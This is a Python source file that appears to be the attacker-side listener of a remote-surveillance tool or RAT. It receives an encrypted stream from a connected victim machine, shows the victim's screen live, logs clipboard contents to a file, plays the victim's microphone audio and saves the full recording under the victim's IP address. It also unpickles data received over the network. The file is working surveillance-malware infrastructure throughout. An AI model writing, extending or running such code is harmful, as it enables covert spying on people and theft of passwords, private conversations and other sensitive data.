import socket
import struct
import pickle
import cv2
import numpy as np
import sounddevice as sd
from scipy.io.wavfile import write
from cryptography.fernet import Fernet


def listener(ip, port):
    port = int(port)
    HOST = ip
    PORT = port

    last_clipboard = None

    print(f"[*] Waiting for connection on {HOST}:{PORT}...")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(1)

    conn, addr = server.accept()
    print(f"[+] Connection received from {addr}")
    print(f"[+] Press 'q' to quit the window")

    # Receive the encryption key from the client
    key = conn.recv(1024)
    cipher = Fernet(key)

    data_buffer = b""
    payload_size = struct.calcsize("Q")

    # Buffer to save all audio chunks for optional saving
    audio_buffer = []

    while True:
        try:
            # Ensure we have the payload size
            while len(data_buffer) < payload_size:
                packet = conn.recv(4096)
                if not packet:
                    raise ConnectionError("Connection closed by the client.")
                data_buffer += packet

            # Unpack the message size
            packed_msg_size = data_buffer[:payload_size]
            data_buffer = data_buffer[payload_size:]
            msg_size = struct.unpack("Q", packed_msg_size)[0]

            # Ensure we have the entire encrypted message
            while len(data_buffer) < msg_size:
                packet = conn.recv(4096)
                if not packet:
                    raise ConnectionError("Connection closed by the client.")
                data_buffer += packet

            encrypted_data = data_buffer[:msg_size]
            data_buffer = data_buffer[msg_size:]

            # Decrypt and deserialize the data (frame, clipboard, audio)
            decrypted_data = cipher.decrypt(encrypted_data)
            data = pickle.loads(decrypted_data)

            frame = data.get("frame")
            clipboard = data.get("clipboard", "")
            audio_chunk = data.get("audio")

            # Display the screen frame
            if isinstance(frame, np.ndarray) and len(frame.shape) == 3:
                cv2.imshow(f"{addr} -> Screen", frame)

            # Save clipboard content
            if clipboard and clipboard != last_clipboard:
                with open("clipboard_data.txt", "a") as clipboard_file: 
                    cb_text = f"Client: {addr}\nData: {clipboard}\n\n"
                    clipboard_file.write(cb_text)

                last_clipboard = clipboard

            # Play audio live and buffer it for saving later
            if isinstance(audio_chunk, np.ndarray) and audio_chunk.size > 0:
                sd.play(audio_chunk, samplerate=44100)  # Live playback
                audio_buffer.append(audio_chunk)  # Save for complete recording

            # Exit condition
            if cv2.waitKey(1) & 0xFF == ord('q'):
                break

        except ConnectionError as ce:
            print(f"[!] Connection Error: {ce}")
            break
        except Exception as e:
            print(f"[!] Error processing data: {e}")
            break

    # Save the complete audio recording after connection closes
    if audio_buffer:
        complete_audio = np.concatenate(audio_buffer)

        # Ensure correct data type for WAV
        if complete_audio.dtype != np.int16:
            complete_audio = np.int16(complete_audio * 32767)

        write(f"{addr[0]}_complete_audio.wav", 44100, complete_audio)
        print(f"[+] Full audio saved as {addr[0]}_complete_audio.wav")

    cv2.destroyAllWindows()
    conn.close()
    server.close()